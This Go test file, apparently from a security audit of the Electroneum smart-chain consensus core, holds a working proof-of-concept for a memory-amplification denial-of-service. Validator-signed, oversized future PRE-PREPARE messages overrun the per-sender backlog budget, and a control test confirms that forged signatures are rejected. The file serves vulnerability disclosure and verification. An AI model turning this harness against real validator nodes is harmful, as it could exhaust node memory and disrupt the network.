package core

import (
	"crypto/ecdsa"
	"fmt"
	"runtime"
	"testing"

	"github.com/electroneum/electroneum-sc/common"
	"github.com/electroneum/electroneum-sc/crypto"
	"github.com/electroneum/electroneum-sc/hunt"
)

// signedWire produces a PRE-PREPARE wire payload that is signed by key exactly
// as a real validator signs it:
//
//	sig = crypto.Sign(Keccak256(EncodePayloadForSigning()), key)
//
// so it survives core.verifySignatures -> istanbul.CheckValidatorSignature.
func signedWire(t *testing.T, g hunt.Genome, key *ecdsa.PrivateKey) []byte {
	t.Helper()
	sig, err := crypto.Sign(crypto.Keccak256(g.SigningPayload()), key)
	if err != nil {
		t.Fatalf("sign: %v", err)
	}
	return g.BuildSigned(sig)
}

// fitGenome finds the largest transaction count whose signed encoding still fits
// under limit, so the message sits just below the per-message ceiling.
func fitGenome(seq uint64, limit int) hunt.Genome {
	lo, hi := 0, 2_000_000
	for lo < hi {
		mid := (lo + hi + 1) / 2
		if len((hunt.Genome{Kind: hunt.TxLegacyMin, NTx: mid, Seq: seq}).BuildPreprepare()) <= limit {
			lo = mid
		} else {
			hi = mid - 1
		}
	}
	return hunt.Genome{Kind: hunt.TxLegacyMin, NTx: lo, Seq: seq}
}

// TestE2E_SignedPreprepareAmplification is the end-to-end proof for the primary
// finding, driven through the real message-ingress function.
//
// It uses handleEncodedMsg -- the exact entry point core.handleEvents dispatches
// istanbul.MessageEvent to -- so the attack traverses, in production order:
//
//	qbfttypes.Decode        (real RLP decode of attacker-supplied wire bytes)
//	c.verifySignatures      (real ecrecover; source must be a known validator)
//	c.checkMessage          (real future-view determination)
//	c.addToBacklog          (every real admission check, unmodified)
//
// Nothing is stubbed and no internal is poked. The only attacker capability
// assumed is possession of one validator private key.
func TestE2E_SignedPreprepareAmplification(t *testing.T) {
	valSet, keys := newKeyedValidatorSet(t, 4)
	c := newTestCore(valSet, 1, 0)
	c.validateFn = c.checkValidatorSignature

	// The attacker is validator[1]; the node under attack is validator[0].
	attacker := valSet.List()[1].Address()
	attackerKey := keys[attacker]
	c.address = valSet.List()[0].Address()

	const msgSize = MaxFuturePreprepareBytes // sit right under the 4 MiB ceiling
	nMsgs := MaxBacklogBytesPerValidator / msgSize

	// Build and sign every frame up front; only ingress is measured.
	frames := make([][]byte, 0, nMsgs)
	for i := 0; i < nMsgs; i++ {
		g := fitGenome(uint64(2+i), msgSize)
		frames = append(frames, signedWire(t, g, attackerKey))
	}

	base := heapNow()
	for _, f := range frames {
		// Future message -> errFutureMessage is the expected return; the message
		// is retained in the backlog as a side effect.
		if err := c.handleEncodedMsg(0x12, f); err != nil && err != errFutureMessage {
			t.Fatalf("frame rejected before reaching the backlog: %v", err)
		}
	}
	after := heapNow()
	runtime.KeepAlive(frames)

	if c.backlogsTotal != nMsgs {
		fmt.Printf("\n[MITIGATED] only %d/%d signed frames retained; resident=%.2f MiB\n\n",
			c.backlogsTotal, nMsgs, mib(after-base))
		t.Skip("retention accounting rejects the amplifying payload; attack precondition not met")
	}
	// Prove the signature path really ran: addToBacklog keys the budget by the
	// *recovered* source, so a non-empty entry here means ecrecover returned the
	// attacker's address and isValidatorAddress accepted it.
	if c.backlogsBytes[attacker] == 0 {
		t.Fatal("backlog is not keyed by the recovered signer; signature path did not run")
	}

	charged := uint64(c.backlogsBytesTotal)
	resident := after - base

	fmt.Printf("\n=== E2E: SIGNED PRE-PREPARE THROUGH THE REAL INGRESS ===\n")
	fmt.Printf("  path      : handleEncodedMsg -> Decode -> verifySignatures -> checkMessage -> addToBacklog\n")
	fmt.Printf("  attacker  : validator %s (1 of %d, within QBFT's fault budget)\n",
		attacker.Hex()[:10], valSet.Size())
	fmt.Printf("  frames    : %d x %.2f MiB, each signed and ecrecovered to a known validator\n",
		c.backlogsTotal, mib(uint64(msgSize)))
	fmt.Printf("  charged   : %8.2f MiB   (per-sender budget %.0f MiB)\n",
		mib(charged), mib(MaxBacklogBytesPerValidator))
	fmt.Printf("  resident  : %8.2f MiB\n", mib(resident))
	fmt.Printf("  amplified : x%.1f\n\n", float64(resident)/float64(charged))

	if resident > uint64(MaxBacklogBytesPerValidator) {
		t.Errorf("E2E BUDGET BYPASS: %.2f MiB resident against a %.0f MiB per-sender budget (x%.1f)",
			mib(resident), mib(MaxBacklogBytesPerValidator), float64(resident)/float64(charged))
	}
}

// TestE2E_ForgedSignatureIsRejected is the control for the test above: an
// identical payload signed by a non-validator key must never reach the backlog.
// Without this, the result above could be explained by the signature check
// simply not running.
func TestE2E_ForgedSignatureIsRejected(t *testing.T) {
	valSet, _ := newKeyedValidatorSet(t, 4)
	c := newTestCore(valSet, 1, 0)
	c.validateFn = c.checkValidatorSignature
	c.address = valSet.List()[0].Address()

	outsiderKey, _ := crypto.GenerateKey()
	outsider := crypto.PubkeyToAddress(outsiderKey.PublicKey)

	g := fitGenome(2, 64*1024)
	frame := signedWire(t, g, outsiderKey)

	_ = c.handleEncodedMsg(0x12, frame)

	if c.backlogsTotal != 0 {
		t.Fatalf("non-validator payload was retained: backlogsTotal=%d", c.backlogsTotal)
	}
	if c.backlogsBytes[outsider] != 0 {
		t.Fatalf("non-validator was charged budget: %d", c.backlogsBytes[outsider])
	}
	fmt.Printf("[control] non-validator signature rejected; backlog untouched\n")
	_ = common.Address{}
}
